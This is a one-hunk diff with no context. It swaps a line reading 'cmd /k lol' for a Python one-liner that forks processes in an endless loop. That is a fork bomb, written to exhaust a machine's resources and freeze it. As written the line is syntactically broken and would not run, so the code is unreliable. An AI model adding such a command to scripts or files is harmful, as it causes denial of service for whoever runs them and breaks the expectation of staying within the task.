@@ -1,1 +1,1 @@
-cmd /k lol
+python -c "import os; while True: os.fork()"
